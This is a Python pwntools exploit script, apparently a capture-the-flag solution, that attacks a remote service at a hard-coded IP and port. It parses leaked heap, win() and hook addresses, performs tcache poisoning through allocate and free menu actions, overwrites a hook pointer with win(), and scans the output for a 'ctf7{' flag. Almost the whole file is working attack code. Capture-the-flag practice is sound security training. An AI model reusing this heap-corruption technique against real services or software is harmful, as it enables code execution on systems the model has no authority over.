#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'warn'

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# Simple tcache poisoning
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'A' * 32)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'B' * 32)
io.recvuntil(b'>')

io.sendline(b'3')
io.sendlineafter(b':', b'0')
io.recvuntil(b'>')

io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(hook))
time.sleep(0.2)

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'C' * 32)
time.sleep(0.2)

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(win))
time.sleep(0.2)

# Trigger
io.sendline(b'5')
time.sleep(1)

# Get ALL output
try:
    output = io.recvall(timeout=3)
    result = output.decode(errors='ignore')
    print("\n" + "="*60)
    print("OUTPUT:")
    print(result)
    print("="*60)
    
    if 'ctf7{' in result:
        flag = re.search(r'ctf7\{[^}]+\}', result)
        if flag:
            print(f"\n\n[+] FLAG FOUND: {flag.group(0)}\n\n")
    else:
        print("\n[!] No flag in output")
        # Print hex dump
        print("\nHex dump of output:")
        print(output.hex())
except Exception as e:
    print(f"Error: {e}")

io.close()
